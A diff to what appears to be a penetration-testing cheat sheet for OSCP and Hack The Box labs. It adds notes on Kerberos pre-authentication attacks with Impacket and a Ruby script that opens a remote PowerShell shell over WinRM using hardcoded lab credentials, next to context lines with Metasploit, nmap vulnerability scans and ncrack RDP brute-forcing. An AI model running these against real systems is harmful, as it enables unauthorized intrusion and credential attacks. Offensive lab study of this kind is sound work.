@@ -184,6 +184,8 @@ nmap -p69 --script=tftp-enum.nse 10.11.1.111
 ## Kerberos - 88
 
 - MS14-068
+- Impackets library
+- GetNPUser - Pre-auth attack
 - GetUserSPNs
 
 ## Port 110 - Pop3
@@ -230,6 +232,7 @@ msf > use exploit/windows/dcerpc/ms03_026_dcom
 
 ## Port 139/445 - SMB
 
+Impacket!
 
 ```
 nmap --script smb-enum-*,smb-vuln-*,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-protocols -p 139,445 10.11.1.111
@@ -397,7 +400,30 @@ ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://10.11.1.111
 https://github.com/Hackplayers/evil-winrm
 ./evil-winrm.rb -i 10.11.1.111 -u Administrator -p 'password1'
 ```
+Ruby WinRM script, will spawn a powershell shell. I find my shells often will get fucked up with evil-winrm.
+Tip: Wrap it with `rlwrap -a ruby winrm.rb`
 
+```ruby
+require 'winrm'
+
+conn = WinRM::Connection.new( 
+  endpoint: 'http://10.10.10.161:5985/wsman',
+  user: 'HTB.LOCAL\svc-alfresco',
+  password: 's3rvice',
+)
+command=""
+conn.shell(:powershell) do |shell|
+until command == "exit\n" do
+print "PS > "
+command = gets        
+output = shell.run(command) do |stdout, stderr|
+STDOUT.print stdout
+STDERR.print stderr
+end
+end    
+puts "Exiting with code #{output.exitcode}"
+end
+```
 
 
 ## VNC - 5900
